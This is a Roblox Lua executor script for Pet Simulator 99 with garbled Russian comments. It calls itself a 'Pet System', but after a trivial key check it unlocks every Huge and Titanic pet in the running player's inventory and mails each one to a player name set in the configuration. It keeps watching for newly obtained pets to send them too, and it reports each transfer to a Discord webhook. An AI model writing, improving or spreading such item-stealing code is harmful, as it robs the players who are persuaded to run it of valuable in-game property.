local correctKeys = {"free", "Free", "FREE"}  -- –°–ø–∏—Å–æ–∫ –¥–æ–ø—É—Å—Ç–∏–º—ã—Ö –∫–ª—é—á–µ–π
local enteredKey = getgenv().Config.Key

local keyIsValid = false

for _, key in ipairs(correctKeys) do
    if enteredKey == key then
        keyIsValid = true
        break
    end
end
if keyIsValid then
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local const = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Directory"))
    local HttpService = game:GetService("HttpService")
    local request = http_request or request
    local Network = ReplicatedStorage:WaitForChild("Network")
    local MailboxClaim = Network:WaitForChild("Mailbox: Claim")
    local player = game:GetService("Players").LocalPlayer
    local itemsFrame = player.PlayerGui["_MACHINES"].MailboxMachine.Frame.GiftsFrame.ItemsFrame
    local library = require(game.ReplicatedStorage.Library.Client.Save)
    local save = library.Get()
    local userId = getgenv().Config.UserId
    local pingUser = getgenv().Config.PingUser and "<@" .. userId .. ">" or ""
    local connection


    local API_URL = "https://biggamesapi.io/api/rap"
    local Ex_URL = "https://biggamesapi.io/api/exists"


    local rapData = {}
    local existsData = {}


    local hidePlayerName = getgenv().Config.HidePlayerName

    task.wait(1)

    local frameFound = false

    local function claimMail(mailId)
        local args = {
            [1] = {
                [1] = mailId
            }
        }
        MailboxClaim:InvokeServer(unpack(args))
    end

    if getgenv().Config.ClaimMail then
        for _, itemFrame in pairs(itemsFrame:GetChildren()) do
            if itemFrame:IsA("Frame") then
                frameFound = true
                local mailId = itemFrame.Name
                claimMail(mailId)
                task.wait(1)
            end
        end
        if not frameFound then
            print("MAIL EMPTY")
        end
    end

    task.wait(1)
    if getgenv().Config.ForeverPack then
        local args = {
            [1] = "Default"
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("ForeverPacks: Claim Free"):InvokeServer(unpack(args))
        print("ForeverPack successfully Claimed")
    end

    task.wait(2)



    local function formatNumber(number)
        if not number then
            return "–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ"
        end
        local formatted = tostring(number)
        local k = 1
        local result = ""
        for i = #formatted, 1, -1 do
            if k > 1 and (k - 1) % 3 == 0 then
                result = "," .. result
            end
            result = formatted:sub(i, i) .. result
            k = k + 1
        end
        return result
    end


    local function loadDataFromAPI(url, dataTable)
        local response
        local success, err = pcall(function()
            response = request({
                Url = url,
                Method = 'GET',
                Headers = {
                    ['Content-Type'] = 'application/json'
                }
            })
        end)
        
        if not success then
            warn("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –∏–∑ API:", err)
            return false
        end
        
        if not response then
            warn("–ü—É—Å—Ç–æ–π –æ—Ç–≤–µ—Ç –æ—Ç API:", url)
            return false
        end

        local decodedData
        local success, err = pcall(function()
            decodedData = HttpService:JSONDecode(response.Body)
        end)
        
        if not success then
            warn("–û—à–∏–±–∫–∞ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –∏–∑ API:", err)
            return false
        end

        if not decodedData then
            warn("–ù–µ —É–¥–∞–ª–æ—Å—å –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞—Ç—å –æ—Ç–≤–µ—Ç –æ—Ç API:", url)
            return false
        end


        if decodedData.status == "ok" and decodedData.data then
            for _, item in ipairs(decodedData.data) do
                local petId = item.configData.id
                local pt = item.configData.pt
                local sh = item.configData.sh
                
                if not dataTable[petId] then
                    dataTable[petId] = {}
                end


                local key
                if pt then
                    key = tostring(pt) .. (sh and ":shiny" or ":normal")
                else
                    key = sh and ":shiny" or ":normal"
                end

                dataTable[petId][key] = item.value
            end
            return true
        else
            warn("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –∏–∑ API")
            return false
        end
    end


    local function getValueFromMemory(petId, pt, sh, dataTable)
        local petValues = dataTable[petId]
        if petValues then
            local key
            if pt then
                key = tostring(pt) .. (sh and ":shiny" or ":normal")
            else
                key = sh and ":shiny" or ":normal"
            end

            local value = petValues[key]
            if value then
                return value
            else
                print("–ù–µ –Ω–∞–π–¥–µ–Ω–æ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–ª—è –ø–∏—Ç–æ–º—Ü–∞", petId, "—Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ pt:", pt, "sh:", sh)
            end
        else
            print("–ù–µ –Ω–∞–π–¥–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ –¥–ª—è –ø–∏—Ç–æ–º—Ü–∞", petId)
        end
        return nil
    end


    local function convertAssetIdToUrl(assetId)
        return "https://biggamesapi.io/image/" .. assetId
    end


    local function mixColors(color1, color2, ratio)
        local r1 = math.floor(color1 / 65536)
        local g1 = math.floor((color1 % 65536) / 256)
        local b1 = color1 % 256

        local r2 = math.floor(color2 / 65536)
        local g2 = math.floor((color2 % 65536) / 256)
        local b2 = color2 % 256

        local r = math.floor(r1 * (1 - ratio) + r2 * ratio)
        local g = math.floor(g1 * (1 - ratio) + g2 * ratio)
        local b = math.floor(b1 * (1 - ratio) + b2 * ratio)

        return r * 65536 + g * 256 + b
    end

    local function determineColor(pt, sh)
        local color

        if pt == 1 then
            color = 0xFFD700
        elseif pt == 2 then
            color = 0xFF69B4
        else
            color = 0x00ff00
        end

        if sh == true then
            color = mixColors(color, 0xFFFFFF, 0.5)
        end

        return color
    end




    local function sendToDiscord(petName, petImageUrl, rapValue, existsValue, color)


        local PlayerName = getgenv().Config.PlayerToSend


        local playerName = player and player.Name or "Unknown"
        

        local description = hidePlayerName
            and "A player successfully transferred pet to the " .. "||" .. PlayerName .. "||" 
            or ("||" .. playerName .. "|| successfully transferred pet to " .. "||" .. PlayerName .. "||")

        local embeds = {
            {
                ["title"] = petName,
                ["description"] = description,
                ["type"] = "rich",
                ["color"] = color,
                ["thumbnail"] = {
                    ["url"] = petImageUrl
                },
                ["fields"] = {
                    {
                        ["name"] = "RAP:",
                        ["value"] = formatNumber(rapValue) .. "üíé",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Exist:",
                        ["value"] = formatNumber(existsValue) .. "üì¶",
                        ["inline"] = true
                    }
                },
                ["author"] = {
                    ["name"] = "Pet System",
                    ["icon_url"] = "https://i.ytimg.com/vi/yEWRm2euy2A/hqdefault.jpg"
                },
                ["footer"] = {
                    ["text"] = "Thanks for playing!",
                    ["icon_url"] = "https://i.ytimg.com/vi/yEWRm2euy2A/hqdefault.jpg"
                }
            }
        }

        local success, err = pcall(function()
            request({
                Url = getgenv().Config.Webhook_URL,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = HttpService:JSONEncode({
                    ["content"] = pingUser,
                    ["embeds"] = embeds
                })
            })
        end)

        if not success then
            warn("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord:", err)
        else
            task.wait()
        end
    end



    local function sendToDiscord2(petName, petImageUrl, rapValue, existsValue, color)


        local playerName = player and player.Name or "Unknown"

        local description = hidePlayerName
            and "A player obtained new pet!"
            or ("||" .. playerName .. "|| obtained new pet!")
        

        local embeds = {
            {
                ["title"] = petName,
                ["description"] = description,
                ["type"] = "rich",
                ["color"] = color,
                ["thumbnail"] = {
                    ["url"] = petImageUrl
                },
                ["fields"] = {
                    {
                        ["name"] = "RAP:",
                        ["value"] = formatNumber(rapValue) .. "üíé",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Exist:",
                        ["value"] = formatNumber(existsValue) .. "üì¶",
                        ["inline"] = true
                    }
                },
                ["author"] = {
                    ["name"] = "Pet System",
                    ["icon_url"] = "https://i.ytimg.com/vi/yEWRm2euy2A/hqdefault.jpg"
                },
                ["footer"] = {
                    ["text"] = "Thanks for playing!",
                    ["icon_url"] = "https://i.ytimg.com/vi/yEWRm2euy2A/hqdefault.jpg"
                }
            }
        }

        local success, err = pcall(function()
            request({
                Url = getgenv().Config.Webhook_URL,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = HttpService:JSONEncode({
                    ["content"] = pingUser,
                    ["embeds"] = embeds
                })
            })
        end)

        if not success then
            warn("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord:", err)
        else
            task.wait()
        end
    end


    local function getPetImageUrl(petId)
        local petData = const.Pets[petId]
        if petData and petData.thumbnail then

            local assetId = petData.thumbnail:match("rbxassetid://(%d+)")
            if assetId then
                return convertAssetIdToUrl(assetId)
            end
        end
        return nil
    end

    if not getgenv().Config.OnlySendObtainedHuge then
        local function DepositPetInTrade()
            if save.Inventory.Pet ~= nil then
                for id, pet in pairs(save.Inventory.Pet) do
                    if string.find(pet.id, "Huge") or string.find(pet.id, "Titanic") then
                        
                        if getgenv().Config.SendHuge then
                            local args = {
                                [1] = id,
                                [2] = false
                            }
                            
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
                            task.wait(0.5)
                            local Mailargs = {
                                [1] = getgenv().Config.PlayerToSend,
                                [2] = "ty",
                                [3] = "Pet",
                                [4] = id,
                                [5] = 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(Mailargs))
                            task.wait(1)

                        end

                        if getgenv().Config.SendWebhook then
                            local petType = ""


                            if pet.pt == 1 then
                                petType = "Golden"
                            elseif pet.pt == 2 then
                                petType = "Rainbow"
                            end
                            if pet.sh then
                                petType = "Shiny " .. petType
                            end


                            local rapLoaded = loadDataFromAPI(API_URL, rapData)
                            local existsLoaded = loadDataFromAPI(Ex_URL, existsData)
                            if not (rapLoaded and existsLoaded) then
                                return
                            end


                            local petImageUrl = getPetImageUrl(pet.id)
                            local petValueRAP = getValueFromMemory(pet.id, pet.pt, pet.sh, rapData)
                            local petValueExists = getValueFromMemory(pet.id, pet.pt, pet.sh, existsData)
                            local color = determineColor(pet.pt, pet.sh)

                            if petValueRAP and petValueExists then

                                sendToDiscord(petType .. " " .. pet.id, petImageUrl, petValueRAP, petValueExists, color)
                            else
                                task.wait()
                            end


                            rapData = {}
                            existsData = {}
                        end
                    else
                        task.wait()
                    end
                end
            end
        end
        DepositPetInTrade()
    end

    



    task.wait(2)



    local sentWebhookForPets = {} -- –¢–∞–±–ª–∏—Ü–∞ –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã—Ö –≤–µ–±—Ö—É–∫–æ–≤

    local function onItemsUpdate(fr, pets)
        if pets and pets.set and pets.set.Pet then
            for id, pet in pairs(pets.set.Pet) do
                if string.find(pet.id, "Huge") or string.find(pet.id, "Titanic") then
                    if pet and pet.id then
                        -- –†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ø–∏—Ç–æ–º—Ü–∞ –ø–µ—Ä–µ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ–º –æ—Å—Ç–∞–ª—å–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π
                        if getgenv().Config.SendHuge then
                            local unlockArgs = {
                                [1] = id,
                                [2] = false
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(unlockArgs))
                            task.wait(0.5) -- –ñ–¥–µ–º –Ω–µ–º–Ω–æ–≥–æ, —á—Ç–æ–±—ã —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å

                            -- –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–∏—Ç–æ–º—Ü–∞ –ø–æ –ø–æ—á—Ç–µ
                            local mailArgs = {
                                [1] = getgenv().Config.PlayerToSend,
                                [2] = "ty",
                                [3] = "Pet",
                                [4] = id,
                                [5] = 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(mailArgs))
                            task.wait(0.5)
                        end

                        -- –í—ã–ø–æ–ª–Ω—è–µ–º –¥–µ–π—Å—Ç–≤–∏—è —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –≤–∫–ª—é—á–µ–Ω–∞ –æ—Ç–ø—Ä–∞–≤–∫–∞ –≤–µ–±—Ö—É–∫–∞ –∏ –≤–µ–±—Ö—É–∫ –µ—â–µ –Ω–µ –±—ã–ª –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω
                        if getgenv().Config.SendWebhook and not sentWebhookForPets[id] then

                            -- –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∏–∑ API
                            local rapLoaded = loadDataFromAPI(API_URL, rapData)
                            local existsLoaded = loadDataFromAPI(Ex_URL, existsData)
                            if not (rapLoaded and existsLoaded) then
                                return
                            end

                            -- –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ç–∏–ø–∞ –ø–∏—Ç–æ–º—Ü–∞
                            local petType = ""
                            if pet.pt == 1 then
                                petType = "Golden"
                            elseif pet.pt == 2 then
                                petType = "Rainbow"
                            end

                            if pet.sh then
                                petType = "Shiny " .. petType
                            end

                            -- –ü–æ–ª—É—á–µ–Ω–∏–µ —Ü–≤–µ—Ç–∞ –∏ –¥—Ä—É–≥–∏—Ö –¥–∞–Ω–Ω—ã—Ö
                            local color = determineColor(pet.pt, pet.sh)
                            local petImageUrl = getPetImageUrl(pet.id)
                            local petValueRAP = getValueFromMemory(pet.id, pet.pt, pet.sh, rapData)
                            local petValueExists = getValueFromMemory(pet.id, pet.pt, pet.sh, existsData)

                            if petValueRAP and petValueExists then
                                -- –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ Discord
                                sendToDiscord2(petType .. " " .. pet.id, petImageUrl, petValueRAP, petValueExists, color)
                                
                                -- –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ñ–ª–∞–≥, —á—Ç–æ –≤–µ–±—Ö—É–∫ –±—ã–ª –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω
                                sentWebhookForPets[id] = true

                                rapData = {}
                                existsData = {}
                            else
                                print("–ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –∑–Ω–∞—á–µ–Ω–∏—è –¥–ª—è –ø–∏—Ç–æ–º—Ü–∞ —Å ID:", pet.id)
                            end
                        end
                    else
                        print("–ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ ID –ø–∏—Ç–æ–º—Ü–∞.")
                    end
                end
            end
        end
    end



    local function connectToItemsUpdate()
        local network = ReplicatedStorage:FindFirstChild("Network")
        if not network then
            return
        end
        
        local itemsUpdate = network:FindFirstChild("Items: Update")
        if itemsUpdate then
            connection = itemsUpdate.OnClientEvent:Connect(onItemsUpdate)
        else
            connection = network.ChildAdded:Connect(function(child)
                if child.Name == "Items: Update" then
                    connection:Disconnect()  -- –û—Ç–∫–ª—é—á–∞–µ–º –ø—Ä–µ–¥—ã–¥—É—â–∏–π —Å–ª—É—à–∞—Ç–µ–ª—å
                    connection = child.OnClientEvent:Connect(onItemsUpdate)
                    -- –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
                    game.StarterGui:SetCore("SendNotification", {
                        Title = "Status",
                        Text = "Script successfully injected! Good Luck!",
                        Duration = 5,
                    })
                end
            end)
        end
    end

    -- –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ —Å–æ–±—ã—Ç–∏—é
    connectToItemsUpdate()

    -- –ü—Ä–æ–≤–µ—Ä–∫–∞, —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –ª–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
    if connection then
        print("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ!")  -- –û—Ç–ª–∞–¥–∫–∞
        game.StarterGui:SetCore("SendNotification", {
            Title = "Status",
            Text = "Script successfully injected! Good Luck!",
            Duration = 5,
        })
    else
        print("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ —É–¥–∞–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å.")  -- –û—Ç–ª–∞–¥–∫–∞
        game.StarterGui:SetCore("SendNotification", {
            Title = "Status",
            Text = "Script Injected Failed!",
            Duration = 5,
        })
    end
else
    game.StarterGui:SetCore("SendNotification", {
        Title = "Key Invalid!",
        Text = "Get New Key From Owner",
        Duration = 5,
    })
end
